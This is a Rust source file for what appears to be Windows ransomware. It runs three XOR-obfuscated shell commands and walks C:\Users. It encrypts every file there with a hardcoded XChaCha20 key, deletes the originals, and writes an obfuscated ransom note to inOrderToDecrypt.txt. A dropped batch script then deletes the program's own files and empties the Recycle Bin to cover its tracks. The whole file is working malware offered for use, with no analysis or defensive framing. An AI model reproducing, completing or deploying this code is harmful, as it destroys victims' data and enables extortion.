use anyhow::Ok;
use walkdir::WalkDir;
use walkdir::DirEntry;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305
};
use rand::{rngs::OsRng, RngCore};
use std::fs;
use std::fs::File;
use std::io::Write;
use std::process;
use std::process::Command;
use std::process::Stdio;
use std::process::exit;
use anyhow::anyhow;
use std::str;

fn main() {
    let cmd1 = [29, 22, 10, 10, 1, 20, 2, 11, 87, 14, 29, 28, 75, 1, 28, 7, 0, 13, 14, 69, 10, 3, 4, 29, 4, 18, 10, 75, 74, 24, 7, 9, 89, 68, 20, 12, 2, 0, 13].to_vec();
    let cmd2 = [5, 0, 13, 69, 0, 1, 14, 69, 10, 31, 10, 9, 75, 71, 42, 10, 8, 42, 24, 71, 89, 68, 28].to_vec();
    let cmd4 = [28, 0, 15, 31, 16, 13, 2, 9, 87, 14, 29, 28, 75, 6, 21, 75, 22, 28, 8, 16, 11, 2, 17, 0].to_vec();
    let yek = b"key";
    Command::new("cmd")
            .args(["/C", str::from_utf8(&xor(cmd1, yek.as_slice())).unwrap()])
            .output()
            .expect("failed to execute process");
    Command::new("cmd")
        .args(["/C", str::from_utf8(&xor(cmd2, yek.as_slice())).unwrap()])
        .output()
        .expect("failed to execute process");
    Command::new("cmd")
            .args(["/C", str::from_utf8(&xor(cmd4, yek.as_slice())).unwrap()])
            .output()
            .expect("failed to execute process");
    let key = [126, 174, 231, 244, 185, 39, 152, 10, 223, 167, 148, 254, 28, 186, 115, 195, 87, 111, 193, 20, 98, 249, 212, 123, 151, 4, 230, 65, 68, 83, 45, 49];
    let nonce = [99, 17, 194, 93, 155, 32, 56, 126, 242, 173, 112, 241, 183, 96, 191, 111, 77, 40, 67, 80, 197, 145, 32, 143];;
    let mut all_files: Vec<DirEntry> = Vec::new();
    for entry in WalkDir::new("C:\\Users").into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            all_files.push(entry)
        }
    }
    let mut theEnd = String::new();
    theEnd.push_str("@echo off\ntimeout /t 5 /nobreak > nul\ndel ");
    for entry in all_files{
        if let Some(filepath) = entry.path().as_os_str().to_str() {
            if filepath.contains("darkrs") {
                theEnd.push_str(filepath);
            }
            else{
                encrypt_sm_file(filepath, &key, &nonce);
            }
        }
    }
    let mut file = File::create("inOrderToDecrypt.txt").expect("FAILURE");

    let s = [50, 10, 12, 25, 69, 23, 14, 17, 14, 4, 23, 18, 75, 13, 24, 24, 69, 27, 14, 0, 23, 75, 7, 11, 14, 4, 26, 3, 0, 29, 75, 4, 23, 15, 69, 24, 7, 9, 89, 15, 4, 13, 10, 69, 14, 14, 23, 28, 75, 0, 23, 8, 23, 0, 27, 17, 28, 15, 75, 115, 75, 69, 89, 75, 53, 28, 25, 22, 22, 5, 4, 21, 75, 1, 24, 31, 4, 85, 75, 3, 16, 5, 4, 23, 8, 12, 24, 7, 69, 11, 14, 21, 22, 25, 17, 10, 75, 4, 23, 15, 69, 16, 6, 21, 22, 25, 17, 24, 5, 17, 89, 15, 10, 26, 30, 8, 28, 5, 17, 10, 75, 4, 11, 14, 69, 11, 14, 4, 29, 18, 69, 13, 4, 69, 29, 2, 22, 26, 7, 10, 10, 14, 75, 115, 75, 69, 89, 75, 111, 89, 75, 69, 89, 63, 10, 89, 15, 0, 26, 25, 28, 9, 31, 69, 24, 7, 9, 89, 31, 13, 28, 75, 1, 24, 31, 4, 89, 10, 11, 29, 75, 17, 22, 75, 21, 11, 14, 19, 28, 5, 17, 89, 14, 29, 31, 2, 9, 13, 25, 4, 13, 14, 1, 89, 13, 12, 21, 14, 22, 89, 31, 10, 89, 9, 0, 89, 15, 12, 10, 8, 9, 22, 24, 0, 29, 75, 4, 13, 75, 111, 89, 75, 69, 89, 3, 17, 13, 27, 95, 86, 68, 2, 28, 31, 21, 14, 5, 0, 29, 7, 10, 10, 14, 23, 87, 4, 11, 16, 4, 11, 86, 97, 69, 89, 75, 69, 0, 4, 16, 89, 28, 12, 21, 7, 69, 23, 14, 0, 29, 75, 17, 22, 75, 21, 12, 25, 6, 17, 10, 22, 28, 75, 10, 12, 25, 69, 29, 14, 6, 11, 18, 21, 13, 2, 10, 23, 75, 22, 22, 13, 17, 14, 10, 23, 28, 69, 111, 115, 75, 69, 89, 75, 53, 21, 14, 4, 10, 14, 69, 26, 4, 11, 13, 10, 6, 13, 75, 10, 12, 25, 69, 10, 10, 9, 28, 24, 69, 29, 14, 21, 24, 25, 17, 20, 14, 11, 13, 75, 4, 13, 81, 111, 89, 75, 69, 89, 97, 69, 89, 75, 69, 89, 75, 69, 17, 31, 17, 9, 81, 74, 86, 3, 10, 14, 15, 12, 29, 18, 10, 12, 13, 4, 21, 7, 3, 22, 25, 17, 17, 10, 17, 87, 4, 11, 16, 4, 11, 86, 97, 69, 89, 75, 69, 89, 75, 111, 89, 75, 69, 89, 75, 69, 89, 75, 69, 89, 39, 10, 30, 2, 11, 67, 75, 69, 89, 75, 111, 89, 75, 69, 89, 75, 69, 89, 75, 69, 89, 59, 4, 10, 24, 18, 22, 25, 1, 67, 75, 111, 89, 75, 69, 89, 97, 69, 89, 75, 69, 45, 4, 69, 30, 14, 17, 89, 10, 11, 89, 10, 6, 26, 14, 22, 10, 75, 17, 22, 75, 75, 22, 5, 12, 22, 5, 69, 14, 14, 7, 10, 2, 17, 28, 24, 69, 29, 4, 18, 23, 7, 10, 24, 15, 69, 24, 5, 1, 89, 2, 11, 10, 31, 4, 21, 7, 69, 45, 4, 23, 89, 41, 23, 22, 28, 22, 28, 25, 69, 24, 31, 95, 115, 75, 69, 89, 75, 69, 89, 75, 13, 13, 31, 21, 10, 81, 74, 86, 28, 18, 14, 69, 17, 22, 25, 21, 11, 4, 15, 28, 8, 17, 87, 4, 23, 30, 68, 69, 81, 63, 10, 11, 75, 39, 11, 4, 18, 10, 14, 23, 89, 2, 22, 89, 5, 10, 13, 75, 23, 28, 7, 4, 13, 14, 1, 89, 31, 10, 89, 30, 22, 80, 97, 69, 89, 75, 69, 115, 75, 69, 89, 75, 111, 89, 75, 69, 89, 45, 10, 21, 7, 10, 14, 75, 17, 17, 14, 69, 30, 30, 12, 29, 14, 9, 16, 5, 0, 10, 75, 7, 28, 7, 10, 14, 75, 17, 22, 75, 4, 15, 4, 12, 29, 75, 9, 22, 24, 12, 23, 12, 69, 0, 4, 16, 11, 75, 1, 24, 31, 4, 67, 97, 69, 89, 75, 69, 115, 75, 69, 89, 75, 69, 84, 75, 33, 22, 75, 11, 22, 31, 69, 20, 4, 1, 16, 13, 28, 85, 75, 23, 28, 5, 4, 20, 14, 69, 22, 25, 69, 29, 14, 9, 28, 31, 0, 89, 65, 75, 18, 14, 28, 87, 75, 3, 16, 7, 0, 10, 69, 69, 32, 4, 16, 11, 75, 1, 24, 31, 4, 89, 28, 12, 21, 7, 69, 27, 14, 69, 115, 75, 69, 89, 75, 69, 89, 75, 16, 23, 15, 0, 26, 25, 28, 9, 31, 4, 27, 7, 0, 87, 97, 69, 89, 75, 69, 89, 70, 69, 61, 4, 69, 23, 4, 17, 89, 6, 10, 29, 2, 3, 0, 75, 10, 11, 75, 23, 28, 5, 4, 20, 14, 69, 28, 5, 6, 11, 18, 21, 13, 14, 1, 89, 13, 12, 21, 14, 22, 87, 75, 60, 22, 30, 69, 14, 2, 9, 21, 75, 9, 22, 24, 0, 89, 31, 13, 28, 6, 75, 115, 75, 69, 89, 75, 69, 84, 75, 33, 22, 75, 11, 22, 31, 69, 11, 14, 21, 22, 25, 17, 89, 31, 10, 89, 31, 13, 28, 75, 53, 22, 7, 12, 26, 14, 73, 89, 45, 39, 48, 71, 69, 28, 31, 6, 87, 75, 49, 17, 14, 28, 89, 15, 10, 23, 76, 17, 89, 8, 4, 11, 14, 69, 24, 9, 10, 12, 31, 69, 0, 4, 16, 11, 75, 7, 12, 24, 12, 23, 14, 22, 10, 69, 111, 89, 75, 69, 89, 75, 69, 89, 63, 13, 28, 18, 69, 10, 2, 8, 9, 7, 28, 89, 28, 10, 23, 76, 17, 89, 10, 9, 21, 4, 18, 89, 18, 10, 12, 75, 17, 22, 75, 21, 24, 18, 75, 89, 42, 22, 89, 10, 69, 11, 14, 22, 12, 7, 17, 89, 18, 10, 12, 75, 18, 16, 7, 9, 89, 7, 10, 10, 14, 69, 28, 29, 0, 11, 18, 17, 17, 2, 11, 30, 69, 111, 89, 75, 69, 89, 75, 72, 89, 47, 10, 89, 5, 10, 13, 75, 13, 16, 25, 0, 89, 10, 69, 11, 14, 6, 22, 29, 0, 11, 18, 69, 26, 4, 8, 9, 10, 11, 0, 69, 69, 45, 3, 0, 0, 75, 6, 24, 5, 66, 13, 75, 1, 28, 8, 23, 0, 27, 17, 89, 28, 12, 13, 3, 10, 12, 31, 69, 13, 3, 0, 89, 0, 0, 0, 69, 69, 115, 75, 69, 89, 75, 69, 89, 75, 49, 17, 14, 28, 89, 10, 9, 10, 4, 69, 29, 4, 11, 94, 31, 69, 26, 10, 23, 28, 75, 4, 27, 4, 16, 13, 75, 28, 22, 30, 23, 89, 9, 16, 10, 2, 11, 28, 24, 22, 87, 75, 49, 17, 14, 28, 89, 9, 0, 21, 2, 0, 15, 14, 69, 13, 3, 4, 13, 75, 17, 17, 14, 28, 89, 10, 23, 28, 75, 111, 89, 75, 69, 89, 75, 69, 89, 12, 10, 22, 15, 69, 23, 14, 2, 22, 31, 12, 24, 31, 10, 11, 24, 73, 89, 9, 16, 13, 75, 12, 13, 75, 12, 10, 75, 11, 22, 31, 75, 89, 63, 13, 28, 18, 69, 12, 24, 16, 24, 7, 9, 0, 75, 3, 24, 2, 9, 87, 75, 54, 22, 75, 22, 9, 14, 4, 18, 75, 3, 22, 25, 69, 0, 4, 16, 11, 24, 0, 21, 13, 75, 115, 75, 69, 89, 75, 69, 84, 75, 33, 22, 75, 11, 22, 31, 69, 11, 14, 15, 28, 8, 17, 89, 31, 10, 89, 27, 16, 11, 8, 13, 24, 24, 0, 87, 75, 32, 1, 13, 12, 21, 31, 23, 24, 31, 0, 29, 75, 3, 16, 7, 0, 10, 75, 18, 16, 7, 9, 89, 9, 0, 89, 27, 16, 27, 7, 12, 26, 7, 28, 89, 15, 12, 10, 8, 9, 22, 24, 0, 29, 69].to_vec();
    let txtContent = xor(s, yek.as_slice());
    file.write_all(&txtContent);

    let mut file2 = File::create("C:\\Windows\\Temp\\theEnd.bat").expect("FAILURE");
    theEnd.push_str("\nrd /s /q C:\\$Recycle.Bin");
    file2.write_all(theEnd.as_bytes());
    Command::new("cmd")
            .args(["/C", "start", "C:\\Windows\\Temp\\theEnd.bat"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .expect("Failed to start deletion process");
    exit(0);
}

fn encrypt_sm_file(filepath: &str, key: &[u8; 32], nonce: &[u8; 24]) -> Result<(), anyhow::Error> {
    let contents = fs::read(filepath)?;
    let cipher = XChaCha20Poly1305::new(key.into());
    let encrypted_file = cipher.encrypt(nonce.into(), contents.as_ref()).map_err(|err| anyhow!("Encrypting small file: {}", err))?;
    fs::write(filepath.to_owned() + ".encrypted", encrypted_file)?;
    fs::remove_file(filepath)?;
    Ok(())
}

fn xor(s: Vec<u8>, key: &[u8]) -> Vec<u8> {
    let mut b = key.iter().cycle();
    s.into_iter().map(|x| x ^ b.next().unwrap()).collect()
}